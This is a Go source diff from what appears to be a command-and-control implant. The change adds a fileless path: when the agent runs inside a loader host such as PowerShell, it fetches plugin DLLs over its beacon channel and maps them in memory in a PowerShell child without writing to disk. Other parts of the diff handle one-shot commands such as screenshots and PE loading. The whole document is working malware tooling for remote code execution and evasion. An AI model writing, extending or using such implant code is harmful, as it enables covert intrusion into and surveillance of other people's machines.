@@ -58,9 +58,23 @@ var (
 
 var pluginExportPattern = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]{0,127}$`)
 
-// loadPluginPE fetches the plugin in the parent, then sends the raw DLL bytes
-// to a child over stdin. The child performs all mapping and export execution.
+// loadPluginPE runs one plugin invocation to completion: it fetches the
+// plugin over the authenticated beacon channel and executes it in a
+// sacrificial child process — not this process, so a bad plugin
+// implementation can never crash the agent or its host. The child executable
+// follows the hosting mode: an on-disk session uses the historical
+// copy-of-self child (streamed or staged through loadPluginPEContext); a
+// memory-hosted session cannot relaunch os.Args[0] (inside a loader host it
+// names powershell.exe) and must write no binary to disk, so the identical
+// stdin-framed contract runs in a bounded Windows PowerShell child that maps
+// the plugin bytes in memory. One-shot plugin commands (__SCREENSHOT__,
+// __PE_LOAD__, __PLUGIN_COMMAND__) use this path. Long-lived channel
+// plugins use loadPluginPEContext directly and keep the copy-of-self child
+// and its in-memory guard.
 func loadPluginPE(client *http.Client, cfg *config, url, exportName, input string) (string, error) {
+	if memoryHosted() {
+		return loadPluginPEPowershellHost(client, cfg, url, exportName, input)
+	}
 	ctx, cancel := context.WithTimeout(agentContext, pluginRunTimeout)
 	defer cancel()
 	return loadPluginPEContext(ctx, client, cfg, url, exportName, input)
@@ -97,19 +111,14 @@ func loadPluginPEContext(ctx context.Context, client *http.Client, cfg *config, 
 		cmd = exec.CommandContext(ctx, os.Args[0], "--plugin-library-child", exportName, path)
 		cmd.Stdin = strings.NewReader(input)
 	} else {
-		var frame bytes.Buffer
-		_ = binary.Write(&frame, binary.LittleEndian, uint32(len(data)))
-		_ = binary.Write(&frame, binary.LittleEndian, uint32(len(input)))
-		_, _ = frame.Write(data)
-		_, _ = frame.WriteString(input)
 		cmd = exec.CommandContext(ctx, os.Args[0], "--plugin-child", exportName)
-		cmd.Stdin = &frame
+		cmd.Stdin = framePluginForChild(data, input)
 	}
 	var stdout, stderr bytes.Buffer
 	cmd.WaitDelay = 2 * time.Second
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
-	if err := cmd.Run(); err != nil {
+	if err := runPluginCommand(cmd); err != nil {
 		if errors.Is(ctx.Err(), context.DeadlineExceeded) {
 			return "", fmt.Errorf("plugin timed out after %s", pluginRunTimeout)
 		}
